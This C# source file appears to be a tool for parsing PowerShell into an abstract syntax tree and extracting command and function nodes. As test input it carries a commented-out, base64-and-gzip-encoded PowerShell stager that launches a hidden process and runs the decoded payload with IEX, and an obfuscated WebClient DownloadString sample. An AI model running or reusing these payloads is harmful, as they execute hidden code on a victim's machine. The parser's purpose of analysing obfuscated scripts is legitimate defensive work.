using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation.Language;
using System.Text;
using System.Threading.Tasks;

namespace PowerShellInteract
{
    class ASTParser
    {
        static void Parser()
        {
            //string sampleScript = "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJrcOFgCA71WbW/aSBD+3Er9D1aFZFslGBLSpJEq3drG4AAJxMEEOFRt7LW9ZPESe81br//9xrwk5Jr2ev1wViJ2PTO7zz7zzI6DLPYE5bE0WTdsk345e/wofX339k0HJ3gqKYXYOV0M42UWFaXC5Ky8ovzx3pnXmuqbN+BVeLw0+bDPToeXflP6LCkjNJuZfIppPL64MLIkIbHYzkt1IlCakuk9oyRVVOkvqR+RhBxd30+IJ6SvUuFLqc74PWY7t5WBvYhIRyj2c1uLezhHWnJmjApF/vNPWR0dVcal2mOGWarIzioVZFryGZNV6Zuab3i7mhFFblMv4SkPRKlP45PjUi9OcUCuYLU5aRMRcT+VVTgN/CVEZEksvThXvtDWTZFh2Em4h3w/ISlElex4zh8I8JQxVpT+UEY7FDdZLOiUgF2QhM8cksypR9JSA8c+IzckGCtXZLE//K8GKYdB4NURiVqELP0Ebpv7GSPbFWT1e8DPGVbh+WeWgZZv796+exvsZTIv191DgcDozWgzJoBZ6fCUbvw+S+Wi1IZdseDJCqaF2yQj6lga5TkZjcdSgUzOiz8Or+x9wRMvudVvkWhRsb6AaeRy6o8hdJe0gtfPmivjdJ3bfixAkwQ0JuYqxlPq7TWmvJYGEjCyOW5p73YFABV5ZyC+SRgJscgJLUqj78NqUyqeYvWMMp8kyINUpoAKsqy+BLPNkSLbcZtMga7tXIZkBKBssvfeqXm13z2fg5NsMJymRamTQWl5RckhmBG/KKE4pTsTygTfDOVnuO2MCerhVOyXG6uHXO72NHiciiTzIItw/ltnRjyKWU5HUWpQn+grh4b7veVXyTAwYzQOYaU5JAPe5CQ4ItdGAjBzHaglhwh7OmNkCi6bMrcYDqGodyWx0RIOiS+/BnIv9622c0r2XBxAhDw7jIui5NJEwI2R03sorN9CcnBlPGEyErJLjrIvn5G+ErnoC1nXjs77a/s2l+qOqg0xiQBSrIRPdZySj1VHJECZ8l67pgaCZ2DHrO3pD7SCFrRit+G/R09sbp75zctJQ0vMZRQgO7XbjY7ZbTSq80vHrQqnZotmxxbt2t1k4qDGTW8ghjZq3NLyw6C6nl3StdNC/mCpfVzr60VZX64noR8MzCAIzwLnpnJq0Vbf6OrlY9wya1mrry/0cjWt0UWjS3vdh0tL3A9chnuBFt5VPmG6bCUTt8LbaxuhenTirS8Dtx61/dWgoX3qVx9QDSEjrrmWzpsDPUEdzcWhyxfNUK/VQwPplkfJsNuz9G7X0lGvPnk0P2khxN7hSO+7x3Q4u7uJYG4BhKZWrto+WfNBF0iqc4TDG/AJjWMvCsDH/ID0D1c8PcYPOkc6+FjDR8A1mFkdBvbb3jFHLru6w6g1XFmaVhl0qqhRpv16iPIlcah3MUrn5trUKq7P/f7p1SDQ3Dt2ppnG7cwLNE1bNMymN6wsz6/Pzlt96k456mma+z4XCCik4HdabbuBgl5Ubx3k/Ue3fRsnaYQZ6AGu731xWjyxdndwh9M8QlEOWvYDSWLCoLdB99sLHDHGvbw9bO5saE3bhjGGIu3B8OT41ZEqPTmqz+1i/+riYghYoVSehFxqkTgUUbG8PCmX4c4vL6tlOPivH9Lgs5XyvF4xbxwvKHuxG9vspuZFVVgMqsZA8P+D0l1NR/Dj/xulz+9+Yv0lmsvFl0R8Z3754j/R/ptE9DEV4O/A7cTItm2+zsdOTQdfHLt0gVKC3ZN/BF5n4ugKvkX+BuPhEqyJCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);";
            string sampleScript = "&('Ne'+'w-'+'obje'+'ct') system.net.webclient; $wc.downloadstring((('C:c'+('{1}{0}' -f 'Users','rf')+'crf'+'Zh'+('{1}{0}' -f'ua','eny')+('{0}{1}' -f'n L','i')+'c'+('{1}{0}'-f'Docu','rf')+('{2}{0}{1}'-f 'tscr','f','men')+'G'+'i'+('{2}{5}{0}{1}{4}{3}' -f'fInvoke-Obfu','sc','t','ionc','at','Hubcr')+('{0}{2}{1}'-f'rfL','E','ICENS')) -rEPlACe'crf',[ChaR]92))";

            ScriptBlockAst sb = System.Management.Automation.Language.Parser.ParseInput(sampleScript, out Token[] tokens, out ParseError[] errors);
            // AST type list https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.language?view=powershellsdk-1.1.0
            var cmdAst = sb.FindAll(delegate (Ast t) { return t is System.Management.Automation.Language.CommandAst; }, true);
            var funcAst = sb.FindAll(delegate (Ast t) { return t is System.Management.Automation.Language.FunctionDefinitionAst; }, true);
            //foreach(var ast in sb)
            //{

            //}

            //List<ParameterAst> para = sb.ParamBlock.Parameters.ToList();
        }
    }
}
